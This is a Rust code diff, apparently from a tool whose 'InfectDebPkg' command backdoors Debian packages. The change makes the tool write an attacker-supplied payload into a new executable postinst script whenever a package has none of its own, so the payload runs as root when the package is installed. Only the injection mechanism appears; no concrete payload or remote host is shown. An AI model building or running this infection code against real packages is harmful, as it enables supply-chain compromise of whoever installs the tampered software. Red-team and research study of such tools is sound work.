@@ -72,6 +72,9 @@ pub fn patch_control_tar(args: &args::InfectDebPkg, buf: &[u8]) -> Result<Vec<u8
 
         let tar = compression::stream_decompress(comp, buf)?;
         let mut archive = tar::Archive::new(tar);
+        let mut control_header = None;
+        let mut had_postinst = false;
+
         for entry in archive.entries()? {
             let mut entry = entry?;
             let mut header = entry.header().clone();
@@ -95,8 +98,10 @@ pub fn patch_control_tar(args: &args::InfectDebPkg, buf: &[u8]) -> Result<Vec<u8
                     header.set_cksum();
 
                     builder.append(&header, &mut &script[..])?;
+                    had_postinst = true;
                 }
                 (_, "./control") => {
+                    control_header = Some(header.clone());
                     if control_overrides.is_empty() {
                         debug!("Passing through control unparsed");
                         builder.append(&header, &mut entry)?;
@@ -121,6 +126,7 @@ pub fn patch_control_tar(args: &args::InfectDebPkg, buf: &[u8]) -> Result<Vec<u8
                         header.set_size(control.len() as u64);
                         header.set_cksum();
 
+                        debug!("Adding control data to package...");
                         builder.append(&header, &mut &control[..])?;
                     }
                 }
@@ -128,6 +134,18 @@ pub fn patch_control_tar(args: &args::InfectDebPkg, buf: &[u8]) -> Result<Vec<u8
                     builder.append(&header, &mut entry)?;
                 }
             }
+        }
+
+        if let (Some(payload), false) = (&args.payload, had_postinst) {
+            info!("Package has no postinst hook, creating one from scratch...");
+            let mut header = control_header.context("Package had no control file")?;
+            let script = format!("#!/bin/sh\n{}\n", payload);
+            let buf = script.as_bytes();
+            header.set_path("./postinst")?;
+            header.set_mode(0o755);
+            header.set_size(buf.len() as u64);
+            header.set_cksum();
+            builder.append(&header, buf)?;
         }
     }
     let out = compression::compress(comp, &out)?;
